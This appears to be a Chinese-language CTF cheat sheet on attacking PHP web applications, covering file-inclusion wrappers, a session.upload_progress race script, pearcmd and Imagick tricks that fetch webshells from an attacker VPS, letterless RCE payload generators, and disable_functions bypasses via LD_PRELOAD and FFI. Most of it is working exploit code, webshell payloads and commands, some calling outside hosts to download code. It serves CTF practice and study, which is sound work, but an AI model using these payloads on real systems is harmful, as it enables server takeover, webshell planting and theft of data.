?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4 ?c=data:,&lt;?php system(&#39;ls&#39;)?&gt; zip/phar协议包含（有特定后缀） 这个方法适用于验证包含文件为特定后缀时。 zip 首先新建一个zip文件，里面压缩着一个php脚本。 然后构造zip://php.zip#php.jpg： http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg phar (PHP版本&gt;5.3.0) 首先要用phar类打包一个phar标准包： 1234&lt;?php$p = new PharData(dirname(__FILE__).&#x27;./test.zip&#x27;, 0,&#x27;test&#x27;,Phar::ZIP);$p-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt; 会生成一个zip的压缩文件。然后构造 http://127.0.0.1/file.php?file=phar://php.zip/php.jpg 利用session.upload_progress 可以利用session.upload_progress将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。 如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。 session有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。 默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，此时我们可以利用竞争，在session文件内容清空前进行包含利用。 参考：https://www.freebuf.com/vuls/202819.html 常见PHP-Session存放位置 12345/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED 12345678910111213141516171819202122232425262728#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;Q&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;cat fl0g.php&#x27;);&quot;&#125;url = &#x27;http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;q.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessid,data=data) if &#x27;q.txt&#x27; in resp.text: print(resp.text) event.clear() else: #print(&quot;[+++++++++++++]retry&quot;) passif __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in range(1,30): threading.Thread(target=write,args=(session,)).start() for i in range(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 利用PEAR （开启register_argc_argv） ​ PEAR是可重用的PHP组件框架和系统分发，会随PHP安装时自动安装。 ​ ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/eval.php ​ ?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/eval.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ HTTP/1.1（Burpsuite防浏览器转码） ​ ?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://ip/evil.php （路径：/tmp/pear/download/evil.php） 1234567&lt;?phpheader(&#x27;Content-Disposition: attachment; filename=&quot;shell.php&quot;&#x27;);echo &lt;&lt;&lt;EOF&lt;?phpsystem(\\$_GET[0]);?&gt;EOF; ?file=/tmp/pear/download/shell.php&amp;0=/readflag ​ die() / exit()参考：https://www.anquanke.com/post/id/202510 过滤关键词 urlencode 过滤%25 二次编码：a:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35 allow_url_include=Off file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 require_once data URI 的，但是如果 data:,XXX 是一个目录名的话，就会放开限制。 12345678$ php -aInteractive mode enabledphp &gt; echo file_get_contents(&#x27;data:,123456/ricky&#x27;);123456/rickyphp &gt; echo require_once(&#x27;data:,123456/ricky&#x27;);flag&#123;xxxxxxxxxx&#125;php &gt; open()PHP原生类：ZipArchive::open($filename,$flags) 调用可删除文件：ZipArchive::open(&#39;xxx&#39;,ZipArchive::OVERWRITE)=ZipArchive::open(&#39;xxx&#39;,8) parse_url()参考：https://www.cnblogs.com/tr1ple/p/11137159.html //绕过 把//认为是相对路径（PHP&lt;5.4.7）。 如果是//，则被解析成host，后面的内容如果有/，被解析出path，而不是query了。 ///绕过 三个斜杠导致严重不合格的URL，parse_url() 返回FALSE。 basename()返回路径中的文件名部分，会去掉文件名开头的非ASCII值。 var_dump(basename(&quot;\\xffconfig.php&quot;)); =&gt; config.php var_dump(basename(&quot;config.php\\xff&quot;)); =&gt; config.php spl_autoload_register()PHP框架中有自动加载机制，autoload机制可以使得PHP程序有可能在使用类时才自动包含类文件，而不是一开始就将所有的类文件include进来，这种机制也称为lazy loading。 autoload大致可以使用两种方法：__autoload 和 spl 方法。 spl的autoload系列函数使用一个autoload调用堆栈，可以使用 spl_autoload_register 注册多个自定义的autoload函数。 spl_autoload_register() 如果不指定参数，就会自动包含 类名.php 或 类名.inc 的文件，并加载其中的“类名”类。 a. 上传webshell，后缀为 .inc，被重命名为 xxxx.inc； b. 序列化一个类名为 xxxx 的类对象； c. 将序列化以后的字符串作为cookie，发送到服务器上； d. 服务器反序列化这个字符串后，将会自动加载 xxxx 类，由于之前 spl_autoload_register 函数注册的方法，会自动加载 xxxx.inc，从而造成文件包含漏洞。 123&lt;?phpspl_autoload_register(&#x27;system&#x27;);new ls(); 当 spl_autoload_register 的参数不为空时，new一个类 ls，如果该 ls 类未定义，程序会寻找system 函数，并将 ls 作为参数，执行 system 函数，即执行了 system(&#39;ls&#39;);。 当 spl_autoload_register 的参数为空时。然后new一个xxx类，如果该xxx类未定义，程序会在工作空间中寻找 xxx.php 或 xxx.inc，并将其包含。 ​ 参数特性 参数中的+、[、空格、.均会变为_ 参数形式A_B.C：使用A[B.C传入 ​ 无字母/数字/特定符号RCE 取反（~） phpinfo() → (~%8F%97%8F%96%91%99%90)() system(&#39;ls&#39;) → (~%8C%86%8C%8B%9A%92)(~%93%8C) 异或（^） phpinfo() → $_GET[x]&amp;x=phpinfo → ${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}();&x=phpinfo system(&#39;ls&#39;) → $_GET[x]($_GET[y])&amp;x=system&amp;y=ls → ${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y});&x=system&y=ls 无字母情形： phpinfo() → (&#39;484880800&#39;^&#39;8.8-**)00&#39;^&#39;|~||||~()&#39;) system(&#39;ls&#39;) → (&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;) 或（|） 可以直接将需要构造的字符串与反引号进行异或，得到的结果再与反引号相或即可得到原字符串。 123&lt;?phpecho &quot;````````&quot;^&quot;readfile&quot;;echo &quot;````&quot;^&quot;flag&quot;; payload例：（readfile(&quot;/flag&quot;)） $code = &quot;(&#39;````````&#39;|&#39; &#39;)(&#39;/````&#39;|&#39;/ &#39;));//&quot;; 参考： https://blog.csdn.net/miuzzx/article/details/108569080 https://blog.csdn.net/miuzzx/article/details/109143413 构造： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123; for ($j=0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123; $hex_i=&#x27;0&#x27;.dechex($i); &#125; else&#123; $hex_i=dechex($i); &#125; if($j&lt;16)&#123; $hex_j=&#x27;0&#x27;.dechex($j); &#125; else&#123; $hex_j=dechex($j); &#125; $preg = &#x27;/[0-9a-z]/i&#x27;;//根据题目给的正则表达式修改即可 if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123; echo &quot;&quot;; &#125; else&#123; $a=&#x27;%&#x27;.$hex_i; $b=&#x27;%&#x27;.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123; $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;; &#125; &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile); 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg): s1=&quot;&quot; s2=&quot;&quot; for i in arg: f=open(&quot;or_rce.txt&quot;,&quot;r&quot;) while True: t=f.readline() if t==&quot;&quot;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot; #双引号可换单引号 return(output) while True: param=action(input(&quot;\\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot; print(param) ++运算自增构造 1234567891011121314&lt;?php$a=(_/_._)[0];//直接拼接成字符串并切片$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O$o=++$a.$o;//$o=&gt;PO,$a=&gt;P$a++;//Q$a++;//R$o.=++$a;//$o=&gt;POS,$a=&gt;S$o.=++$a;//$o=&gt;POST,$a=&gt;T$_=_.$o;//_POST$$_[0]($$_[_]);//$_POST[0]($_POST[_]);//Payload://code=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=id//code=$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);&amp;_POST=system&amp;_=id 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: 颖奇L&#x27;Amore www.gem-love.comimport requestsfrom urllib.parse import quote_plusdef g(payload, buff): offset = 3 + buff res = &quot;&quot; base = 65 for i in range(len(payload)): if payload[i] == &#x27;_&#x27; or payload[i] == &#x27;/&#x27;: continue _ascii = ord(payload[i]) #init underline = &quot;$&quot; + (&quot;_&quot; * (i + offset)) undefined = &quot;$&quot; + (&quot;_&quot; * (len(payload) + offset + 15)) var = f&quot;++&#123;underline&#125;;$__-=&#123;underline&#125;;$__++;&#123;underline&#125;/=$__;&#123;underline&#125;=((&#123;undefined&#125;/&#123;undefined&#125;).&#123;underline&#125;)&quot;+r&quot;&#123;++$__&#125;;$__--;&quot; res += var; tmp = &#x27;&#x27; if _ascii &gt; base: for i in range(_ascii-base): tmp = tmp + f&quot;++&#123;underline&#125;;&quot; res += tmp first = &quot;$&quot; + (&quot;_&quot; * offset) for i in range(1, len(payload)): if payload[i] == &#x27;_&#x27;: res += f&quot;&#123;first&#125;.=&#x27;_&#x27;;&quot; continue if payload[i] == &#x27;/&#x27;: res += f&quot;&#123;first&#125;.=&#x27;/&#x27;;&quot; continue final_var = &quot;$&quot; + (&quot;_&quot; * (i + offset)) res += f&quot;&#123;first&#125;.=&#123;final_var&#125;;&quot; return [res, &quot;$&quot; + &quot;_&quot; * (offset)]pre = &quot;&#x27;&#x27;);&quot;after = &#x27;//&#x27;buff = len(&#x27;STRTOLOWERSHOW_SOURCE&#x27;)flag = g(&quot;/FLAG&quot;, buff)buff = len(&#x27;STRTOLOWER&#x27;)showsource = g(&quot;SHOW_SOURCE&quot;, buff)buff = 0strtolower = g(&#x27;STRTOLOWER&#x27;, buff)final = &#x27;&#x27;#1.构造STRTOLOWER并存进变量afinal += strtolower[0]a = strtolower[1] # a = &#x27;$___&#x27; # STRTOLOWER#2.构造SHOW_SOURCE并存进变量bfinal += showsource[0]b = showsource[1] # b = &#x27;$_____________&#x27; #SHOW_SOURCE#3.构造/FLAG并存进变量cfinal += flag[0] + flag[1] + &quot;=&#x27;/&#x27;.&quot; + flag[1] + &#x27;;&#x27;c = flag[1] # c = &#x27;$________________________&#x27; #/FLAG#声明好abc变量padding = f&#x27;$______________________________________________=&#123;a&#125;;$_______________________________________________=&#123;b&#125;;$________________________________________________=&#123;c&#125;;&#x27;final += padding# 4.变量d = a(c) 则变量d为/flagd = &quot;$______________________________________________($________________________________________________);&quot;padding = &#x27;$_________________________________________________=&#x27;+dfinal += padding#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)final += &#x27;$_______________________________________________($_________________________________________________);&#x27;final = pre + finalfinal = final + afterprint(final.replace(&#x27;+&#x27;, &#x27;%2b&#x27;)) 12345678910111213141516171819202122232425262728293031323334#关键字构造#$_GET[0]($_GET[1]);need = &#x27;GET&#x27;alpha = list(set(need))alpha.sort()print(alpha)greece = &#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;.split(&#x27; &#x27;)out = &#x27;$_=C;&#x27;cnt = ord(&#x27;C&#x27;)for k in alpha: if ord(k)-ord(&#x27;C&#x27;) in range(26): now_php = &#x27;&#x27; for i in range(ord(k)-cnt): now_php += &#x27;$_++;&#x27; cnt += 1 icon = greece[ord(k)-ord(&#x27;C&#x27;)] now_php += f&#x27;$&#123;icon&#125;=$_;&#x27; out += now_phpfunc = []for k in need: if ord(k)-ord(&#x27;C&#x27;) in range(26): icon = greece[ord(k)-ord(&#x27;C&#x27;)] func += [f&#x27;$&#123;icon&#125;&#x27;] else: func += [k]func = &#x27;.&#x27;.join(func)print(func)payload = f&#x27;&#123;out&#125;?&gt;&lt;?=($&#123;&#123;_.&#123;func&#125;&#125;&#125;[0])($&#123;&#123;_.&#123;func&#125;&#125;&#125;[1]);&#x27;print(payload) 文件上传+执行 参考： https://blog.csdn.net/qq_46091464/article/details/108513145 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。 执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符： *可以代替0个及以上任意字符 ?可以代表1个任意字符 那么，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。 但是，在执行第一个匹配上的文件的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。 glob通配符支持用[^x]的方法来构造“这个位置不是字符x”。可以利用[@-[]来表示大写字母。当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。 POST上传文件数据包： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在上传文件1.php内容添加sh命令： 12#!/bin/shls 上传抓包，构造poc执行命令： ?c=./???/????????[@-[] 通配符（仅无字母） base64: /???/????64 ????.??? bzip2: /???/???/????2 ????.??? [~(异或)][!%FF]形式 123456789101112131415161718def one(s): ss = &quot;&quot; for each in s: ss += &quot;%&quot; + str(hex(255 - ord(each)))[2:].upper() return f&quot;[~&#123;ss&#125;][!%FF](&quot;&quot;&quot;&quot;组成类似于system(pos(next(getallheaders())));即可a=whoami&quot;&quot;&quot;while 1: a = input(&quot;:&gt;&quot;).strip(&quot;)&quot;) aa = a.split(&quot;(&quot;) s = &quot;&quot; for each in aa[:-1]: s += one(each) s += &quot;)&quot; * (len(aa) - 1) + &quot;;&quot; print(s) eval函数下 字符串拼接 a=(s.y.s.t.e.m)(&#39;cat /flag&#39;); 进制编码 a=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;); 异或 a=(&#39;0000000&#39;^&#39;CICDU]&#39;)(&#39;cat /flag&#39;); a=(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;); 套娃 a=eval($_POST[1]);&amp;1=phpinfo(); 纯数字构造（Linux系统级） 12345678910111213$(($&#123;_&#125;))#0$((~$(($&#123;_&#125;))))#-1$((~$(($((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))))))#36#去+号也可$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))#36 #去+号也可 无参数/带参数RCE无参函数 phpinfo() phpversion() chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -&gt; . chr(ord(hebrevc(crypt(phpversion())))) -&gt; . localeconv() 返回一包含本地数字及货币格式信息的数组，而数组第一项就是.。 time() 返回当前Unix时间戳。 localtime() 取得本地时间。 getcwd() 返回当前工作目录。 dirname() 返回路径中的目录部分。 getenv() 获取一个环境变量的值（在7.1之后可以不给予参数）。 getallheaders() 获取全部HTTP请求头信息。（Apache） get_defined_vars() 返回由所有已定义变量所组成的数组。（Nginx） get_defined_functions() 返回由所有已定义函数所组成的数组。 session_start() 启动新会话或者重用现有会话，告诉PHP使用session。（PHP默认是不主动使用session的，配合session_id()） realpath_cache_get() 获得真实路径缓存的详情。 get_class() 获取当前调用方法的类名。 get_called_class() 获取静态绑定后的类名。 ini_get_all() 以数组的形式返回整个php的环境变量（配置信息）。 套用函数（有参） array_map() 返回用户自定义函数作用后的数组。 array_map(&#39;system&#39;,[&#39;ls&#39;]); scandir() 列出指定路径中的文件和目录。 scandir(&#39;.&#39;) glob() 返回匹配指定模式的文件名或目录。 print_r(glob(&quot;*&quot;)); print_r(glob(&quot;./*&quot;)[2]); current() 返回数组中的当前单元，默认取第一个值。 current(localeconv()) → . ?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo(); pos() 返回数组中的当前元素的值，current()函数的别名。 next() / prev() / reset() / end() 将数组的内部指针向前移动一位 / 倒回一位 / 指向第一个单元 / 指向最后一个单元。 end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy （配合自定义请求头绕过关键字） assert() / eval() 命令执行。 assert(phpinfo();); assert(assert($_POST[c])); chdir() 改变目录。 file_get_contents() highlight_file() / show_source() readfile() / readgzfile() echo() print_r() var_dump() dirname() 返回路径中的目录部分。 chr() 从指定的 ASCII 值返回字符。 array_reverse() 以相反的元素顺序返回数组。 array_rand() 返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() 用于反转/交换数组中所有的键名以及它们关联的键值。 array_slice() 在数组中根据条件取出一段值，并返回。 hex2bin() 转换十六进制字符串为二进制字符串。 session_id() 获取到当前的session id。 session_id(session_start()) create_function() 创建一个匿名函数（lambda样式）。代码注入。 hex2bin() 把十六进制值转换为 ASCII 字符。 hex2bin(&#39;73797374656D&#39;) -&gt; system 参考 https://www.cnblogs.com/wangtanzhi/p/12311239.html ​ 列目录 SPL目录类：DirectoryIterator 1234567&lt;?php//可用于猜解文件名$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123; echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;?&gt; SPL目录类：FilesystemIterator 123&lt;?phpecho new FilesystemIterator(getcwd());?&gt; SPL目录类：GlobIterator 可通配例如/var/html/www/flag* scandir() 面向过程方法：opendir()，readdir()，closedir() 面向对象方法：PHP的dir类 ​ 读文件 特殊文件： /proc/self/cmdline - 应用运行的文件夹 /proc/self/environ（/proc/1/environ） - 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示。重要的属性，比如WEB服务的权限 /proc/self/cwd - 当前目录 /proc/pid/fd/[NUM] - 是个目录，包含当前进程打开的每一个文件的文件描述符，这些文件描述符是指向实际文件的一个符号链接 file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file()) fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv() 123456$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;); $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125; $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125; $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125; include() / require() 适用非php文件 SPL文件类：SplFileObject 按行读取，多行需要遍历。适配伪协议，如 php://filter。 Mysql 123456789101112131415161718&lt;?php$conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125; $sql = &quot;SELECT LOAD_FILE(&#x27;/flag.txt&#x27;) as my&quot;;$result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo $row[&quot;my&quot;]; &#125;&#125; else &#123; echo &quot;0 结果&quot;;&#125;$conn-&gt;close();?&gt; ​ 写文件 file_put_contents() SplFileObject::fwrite() 1234567891011121314define(&quot;EV&quot;, &quot;eva&quot;.&quot;l&quot;);define(&quot;GETCONT&quot;, &quot;fil&quot;.&quot;e_get_contents&quot;);// 由于禁止了$，从已有的地方获取$符define(&quot;D&quot;,(GETCONT)(&#x27;/var/www/html/index.php&#x27;)[353]);define(&quot;SHELL&quot;,&quot;&lt;?php &quot;.EV.&quot;(&quot;.D.&quot;_POST[&#x27;a&#x27;]);&quot;);echo (GETCONT)(&#x27;./shell.php&#x27;);class splf extends SplFileObject &#123; public function __destruct() &#123; parent::fwrite(SHELL); &#125;&#125;define(&quot;PHARA&quot;, new splf(&#x27;shell.php&#x27;,&#x27;w&#x27;)); FTP Python开启FTP服务 123456789101112131415from pyftpdlib.authorizers import DummyAuthorizerfrom pyftpdlib.handlers import FTPHandlerfrom pyftpdlib.servers import FTPServerauthorizer = DummyAuthorizer()authorizer.add_anonymous(&quot;./&quot;)handler = FTPHandlerhandler.authorizer = authorizerhandler.masquerade_address = &quot;ip&quot;# 注意要用被动模式handler.passive_ports = range(9998,10000)server = FTPServer((&quot;0.0.0.0&quot;, 23), handler)server.serve_forever() PHP下载 123456789101112131415161718$local_file = &#x27;/tmp/hack1.so&#x27;;$server_file = &#x27;hack.so&#x27;;$ftp_server = &#x27;xxxxx&#x27;;$ftp_port=21;$ftp = ftp_connect($ftp_server,$ftp_port);$login_result = ftp_login($ftp, &#x27;anonymous&#x27;, &#x27;&#x27;);// 注意要开启被动模式ftp_pasv($ftp,1);if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) &#123; echo &quot;Successfully written to $local_file\\n&quot;;&#125; else &#123; echo &quot;There was a problem\\n&quot;;&#125;ftp_close($ftp); ​ 读类信息 ReflectionClass::export() ​ new+原生类 eval(&quot;echo new $a($b);&quot;); 12?a=Exception&amp;b=system(&#x27;whoami&#x27;)?a=SplFileObject&amp;b=system(&#x27;whoami&#x27;) echo new $a($b); 123456列目录?a=DirectoryIterator&amp;b=glob://f*读文件?a=SplFileObject&amp;b=1.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=1.php new $a($b); 参考：Exploiting Arbitrary Object Instantiations in PHP without Custom Classes 12?a=Imagick&amp;b=http://121.40.253.177:7777nc -lvnp 7777 按照文中的POC，在VPS中生成一个图片，含有一句话木马： convert xc:red -set &#39;Copyright&#39; &#39;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#39; positiv e.png 在VPS中监听12345端口，再往服务器发送请求包如下： 12345678910111213141516171819202122232425POST /?b=Imagick&amp;c=vid:msl:/tmp/php* HTTP/1.1Host: 1.1.1.1:32127Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmqTayg6bqrContent-Length: 348------WebKitFormBoundaryeTvfNEmqTayg6bqrContent-Disposition: form-data; name=&quot;123&quot;; filename=&quot;exec.msl&quot;Content-Type: text/plain&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;image&gt;&lt;read filename=&quot;http://vps:12345/positive.png&quot; /&gt;&lt;write filename=&quot;/var/www/html/positive.php&quot;/&gt;&lt;/image&gt;------WebKitFormBoundaryeTvfNEmqTayg6bqr-- 发送后，靶机就往VPS中请求了该文件，并且把该文件下载到了指定目录，访问后即可RCE。 这种手法的限制： 需要通网，当然如果不通网这种手法也存在一个重命名文件的功能，如果网站有上传功能可以利用这个手法将恶意的JPG重命名成PHP； 需要知道网站的目录（比赛中通常是/var/www/html或者/app这类）； 需要在网站目录下有写权限，当然如果知道类似于upload这种文件夹的路径也可以（因为通常它们是可写的； 最最重要的：需要有装Imagick扩展，该扩展其实不是默认自带的（一定程度上限制了攻击面）。 ​ bypass disable_function LD_PRELOAD Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件 /etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和 /etc/ld.so.preload 配置文件中指定的动态链接库依然会被装载，因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。 通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。 利用 error_log 与 mail 函数劫持 getuid 函数，系统通过环境变量(env)中的LD_PRELOAD加载动态链接库。 12345678910111213// hack.c// 将其按照系统操作位数生成对应的so文件// gcc -c -fPIC hack.c -o hack// gcc --share hack -o hack.so#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);&#125; 函数替代：mail() -&gt; mb_send_mail() 参考 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 UAF php7-gc-bypass，php7-backtrace-bypass，php-json-bypass 法1：修改pwn()传入的cmd，上传php至可写目录，include包含执行。 法2：无需上传，将代码放入eval函数执行。 参考题 buuoj-GKCTF2020-CheckIn FFI 使用条件：PHP版本&gt;=7.4 123$ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;cd /;./readflag &gt; /var/www/html/good.txt&quot;); readgzfile(&quot;good.txt&quot;); 